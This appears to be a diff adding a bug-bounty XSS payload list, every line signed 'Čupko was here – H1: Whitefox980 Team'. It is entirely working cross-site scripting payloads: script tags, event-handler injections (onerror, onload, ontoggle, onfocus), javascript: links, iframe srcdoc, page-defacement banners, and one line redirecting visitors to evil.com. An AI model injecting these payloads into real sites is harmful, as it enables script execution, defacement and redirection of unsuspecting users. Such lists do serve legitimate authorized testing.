@@ -1,0 +1,21 @@
+<script>alert("Čupko was here – H1: Whitefox980 Team")</script>
+<h1>Čupko was here – H1: Whitefox980 Team</h1>
+<img src=x onerror="alert('Čupko was here – H1: Whitefox980 Team')">
+<svg onload=alert("Čupko was here – H1: Whitefox980 Team")>
+"><script>document.body.innerHTML+='<div style=position:fixed;top:0;left:0;width:100%;background:#000;color:#0f0;text-align:center;font-size:18px;z-index:9999>Čupko was here<br><b>H1: Whitefox980 Team</b></div>'</script>
+<iframe srcdoc="<h1>Čupko was here – H1: Whitefox980 Team</h1>">
+<math><mtext><img src=x onerror=alert('Čupko was here – H1: Whitefox980 Team')></mtext></math>
+<body onload=alert("Čupko was here – H1: Whitefox980 Team")>
+"><h1 style=color:lime;background:black;padding:5px>Čupko was here – H1: Whitefox980 Team</h1>
+"><img src=x onerror=document.body.innerHTML+="<h1 style='color:lime'>Čupko was here – H1: Whitefox980 Team</h1>">
+<!--Čupko was here – H1: Whitefox980 Team-->
+"><script>location='https://evil.com?who=Chupko+was+here+-+Whitefox980+Team'</script>
+<details open ontoggle=alert("Čupko was here – Whitefox980 Team")>
+<marquee><h1>Čupko was here – Whitefox980 Team</h1></marquee>
+<input autofocus onfocus=alert("Čupko was here – Whitefox980 Team")>
+<video><source onerror="alert('Čupko was here – Whitefox980 Team')">
+<iframe srcdoc="<script>alert('Čupko was here – Whitefox980 Team')</script>">
+<math href="javascript:alert('Čupko was here – Whitefox980 Team')">CLICK</math>
+<isindex type=image src=1 onerror=alert('Čupko was here – Whitefox980 Team')>
+<script>console.log('Čupko was here – Whitefox980 Team')</script>
+<a href="javascript:alert('Čupko was here – Whitefox980 Team')">Proof</a>
